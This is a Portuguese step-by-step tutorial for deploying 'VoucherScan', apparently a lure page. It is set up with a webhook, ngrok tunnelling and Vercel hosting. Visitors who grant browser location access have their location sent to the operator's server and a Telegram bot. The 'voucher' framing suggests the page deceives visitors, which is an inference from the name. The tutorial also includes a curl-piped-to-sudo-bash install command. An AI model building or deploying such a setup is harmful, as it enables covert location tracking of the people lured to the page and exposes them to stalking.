# Tutorial Completo: Configurando e Rodando o VoucherScan

Este tutorial irá guiar um iniciante absoluto para configurar um ambiente de desenvolvimento no Ubuntu e rodar o projeto **VoucherScan**.

---

## 1. Atualizar o Sistema Operacional
Antes de começar, é recomendado atualizar os pacotes do Ubuntu.

```bash
sudo apt update && sudo apt upgrade -y
```

---

## 2. Instalar o Node.js e o npm
O projeto requer o **Node.js 16+**.

### 2.1 Verificar se o Node.js já está instalado
```bash
node -v
```
Se aparecer um número de versão (ex: `v16.13.0`), pule para a próxima etapa.

### 2.2 Instalar o Node.js

```bash
curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt install -y nodejs
```

### 2.3 Verificar a instalação
```bash
node -v  # Deve exibir a versão do Node.js
npm -v   # Deve exibir a versão do npm
```

---

## 3. Instalar o Git
O Git é necessário para clonar o projeto.

```bash
sudo apt install -y git
```
Verifique a instalação:
```bash
git --version
```

---

## 4. Clonar o Repositório BackScan

```bash
git clone https://github.com/ceerqueira/voucherscan.git
cd voucherscan
```

---

## 5. Instalar as Dependências do Projeto

```bash
npm install
```

---

## 6. Configurar as Variáveis do Projeto
Edite o arquivo `server.js`:

```bash
nano server.js
```

Substitua na linha 294, no index.html **const webhookUrl = "[COLOCA_URL_DESTINO_AQUI]";** pela url destino para receber os dados



## 7. Iniciar o Servidor

```bash
node server.js
```

Se tudo estiver correto, a saída deve indicar que o servidor está rodando.

---

## 9. Instalar e Configurar o Ngrok
O **Ngrok** é usado para expor o servidor local para a internet.

### 9.1 Baixar e Instalar o Ngrok
```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
chmod +x ngrok
sudo mv ngrok /usr/local/bin/
```

### 9.2 Criar Conta no Ngrok
Acesse [https://ngrok.com/](https://ngrok.com/) e crie uma conta.

Após criar a conta, pegue seu **Authtoken** e rode:
```bash
ngrok authtoken SEU_AUTHTOKEN
```

---

## 10. Expor o Servidor com o Ngrok

```bash
ngrok http 8088
```

Copie a **URL gerada pelo Ngrok** (exemplo: `https://abc123.ngrok.io`).

---

## 11. Atualizar a URL no Projeto
Abra o arquivo `index.html`:
```bash
nano index.html
```
Substitua `https://abc123.ngrok.io` pela URL gerada pelo Ngrok:
```js
fetch("https://abc123.ngrok.io/send-location", {
```
Salve as alterações (**CTRL + X**, **Y**, **Enter**).

---

## 12. Testar o Projeto
Abra o **index.html** no navegador e permita o acesso à localização. Se tudo estiver correto, a localização será enviada para o bot no Telegram.

---

## 13. Hospedar a Página HTML na Vercel

Para deixar a interface do **BackScan** online, vamos hospedar o `index.html` na Vercel.

### 13.1 Criar uma Conta na Vercel
1. Acesse [https://vercel.com/](https://vercel.com/) e crie uma conta (pode usar o login do GitHub).
2. Após logar, clique em **"New Project"**.

### 13.2 Subir o Projeto para o GitHub
Caso ainda não tenha subido o código:
```bash
git init
git add index.html
git commit -m "Adiciona interface do VoucherScan"
git branch -M main
git remote add origin https://github.com/seu-usuario/voucherscan-frontend.git
git push -u origin main
```

### 13.3 Implantar na Vercel
1. Na Vercel, clique em **"Import Git Repository"** e selecione o repositório do seu projeto.
2. Escolha as configurações padrão e clique em **Deploy**.
3. Após a implantação, copie a URL gerada .

Agora qualquer pessoa pode acessar sua página! 🚀

---

## Conclusão
Agora você tem o projeto VoucherScan rodando do zero no Ubuntu, mesmo sem experiência em programação. 🚀

